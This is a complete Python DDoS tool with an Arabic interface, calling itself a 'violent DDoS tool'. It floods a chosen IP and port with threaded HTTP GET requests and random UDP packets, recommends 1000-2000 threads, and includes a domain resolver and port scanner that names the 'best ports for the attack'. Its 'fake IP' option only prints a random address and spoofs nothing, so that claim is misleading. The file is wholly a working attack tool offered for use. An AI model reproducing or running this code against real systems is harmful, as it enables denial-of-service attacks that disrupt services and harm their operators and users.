import random
import socket
import threading
import sys
from colorama import Fore, Style, init
from fake_useragent import UserAgent
import dns.resolver

init(autoreset=True)

ua = UserAgent()

colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]

def random_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

def http_attack(target_ip, target_port, fake_ip, show_packets):
    while True:
        try:
            color = random.choice(colors)

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))

            msg = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {ua.random}\r\n\r\n".encode('ascii')
            sock.send(msg)

            if show_packets:
                print(color + f"[+] هجوم HTTP على {target_ip}:{target_port} من IP وهمي {fake_ip} - User-Agent: {ua.random}" + Style.RESET_ALL)
            
            sock.close()
        except Exception as e:
            print(Fore.RED + f"[-] خطأ أثناء الهجوم: {e}" + Style.RESET_ALL)
            continue
def udp_attack(target_ip, target_port, show_packets):
    while True:
        try:
            color = random.choice(colors)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            msg = random._urandom(1024)  
            sock.sendto(msg, (target_ip, target_port))

            if show_packets:
                print(color + f"[+] حزمة UDP تم إرسالها إلى {target_ip}:{target_port}" + Style.RESET_ALL)

        except Exception as e:
            print(Fore.RED + f"[-] خطأ أثناء إرسال حزمة UDP: {e}" + Style.RESET_ALL)
            continue

def start_attack(target_ip, target_port, fake_ip, threads, show_packets):
    for i in range(threads // 2):
        thread = threading.Thread(target=http_attack, args=(target_ip, target_port, fake_ip, show_packets))
        thread.daemon = True
        thread.start()

    for i in range(threads // 2):
        thread = threading.Thread(target=udp_attack, args=(target_ip, target_port, show_packets))
        thread.daemon = True
        thread.start()

def get_ip_and_ports(domain):
    try:
        if domain.startswith("http://"):
            domain = domain[len("http://"):]
        elif domain.startswith("https://"):
            domain = domain[len("https://"):]

        domain = domain.split('/')[0]

        answers = dns.resolver.resolve(domain, 'A')
        target_ip = answers[0].to_text()
        print(Fore.GREEN + f"[+] IP للموقع {domain}: {target_ip}")

        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 8080]
        open_ports = []

        print(Fore.YELLOW + "[*] جاري فحص المنافذ الشائعة...")

        for port in common_ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)  
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                open_ports.append(port)
            sock.close()

        if open_ports:
            print(Fore.GREEN + f"[+] المنافذ المفتوحة على {target_ip}: {', '.join(map(str, open_ports))}")
        else:
            print(Fore.RED + "[-] لم يتم العثور على منافذ مفتوحة.")

        return target_ip, open_ports

    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.NoNameservers, socket.gaierror):
        print(Fore.RED + "[-] خطأ: لم يتم العثور على IP للموقع. تحقق من الرابط.")
        return None, []

def main_menu():
    print(Fore.CYAN + "=========================")
    print(Fore.CYAN + "       أداة DDoS عنيفة       ")
    print(Fore.CYAN + "=========================")
    print(Fore.GREEN + "[1] استهداف IP معين")
    print(Fore.GREEN + "[2] استهداف باستخدام IP وهمي عشوائي")
    print(Fore.YELLOW + "[3] الحصول على IP الموقع وافضل البورتات للهجوم")
    print(Fore.RED + "[0] خروج")
    print(Fore.CYAN + "=========================")

def main():
    while True:
        main_menu()
        try:
            choice = int(input(Fore.YELLOW + "اختر خيار: " + Style.RESET_ALL))

            if choice == 1:
                target_ip = input(Fore.YELLOW + "أدخل IP الهدف: " + Style.RESET_ALL)
                target_port = int(input(Fore.YELLOW + "أدخل المنفذ (Port): " + Style.RESET_ALL))
                fake_ip = input(Fore.YELLOW + "أدخل IP وهمي (أو اكتب 'random' للحصول على IP عشوائي): " + Style.RESET_ALL)

                if fake_ip.lower() == 'random':
                    fake_ip = random_ip()

                threads = int(input(Fore.YELLOW + "أدخل عدد Threads (يفضل بين 1000-2000): " + Style.RESET_ALL))
                show_packets = input(Fore.YELLOW + "هل ترغب في عرض كل حزمة مرسلة؟ (نعم/لا): " + Style.RESET_ALL).lower() == 'نعم'

                start_attack(target_ip, target_port, fake_ip, threads, show_packets)

            elif choice == 2:
                target_ip = input(Fore.YELLOW + "أدخل IP الهدف: " + Style.RESET_ALL)
                target_port = int(input(Fore.YELLOW + "أدخل المنفذ (Port): " + Style.RESET_ALL))
                threads = int(input(Fore.YELLOW + "أدخل عدد Threads (يفضل بين 1000-2000): " + Style.RESET_ALL))
                show_packets = input(Fore.YELLOW + "هل ترغب في عرض كل حزمة مرسلة؟ (نعم/لا): " + Style.RESET_ALL).lower() == 'نعم'

                fake_ip = random_ip()

                start_attack(target_ip, target_port, fake_ip, threads, show_packets)

            elif choice == 3:
                domain = input(Fore.YELLOW + "أدخل الرابط (domain) للموقع: " + Style.RESET_ALL)
                target_ip, open_ports = get_ip_and_ports(domain)

                if target_ip and open_ports:
                    print(Fore.GREEN + f"[+] يمكنك استخدام هذا IP: {target_ip} للهجوم.")
                    print(Fore.GREEN + f"[+] أفضل المنافذ للهجوم هي: {', '.join(map(str, open_ports))}")

            elif choice == 0:
                print(Fore.GREEN + "خروج... شكراً لاستخدامك الأداة!")
                sys.exit()

            else:
                print(Fore.RED + "خيار غير صالح! حاول مرة أخرى.")

        except ValueError:
            print(Fore.RED + "أدخل رقمًا صحيحًا من الخيارات.")

if __name__ == "__main__":
    main()
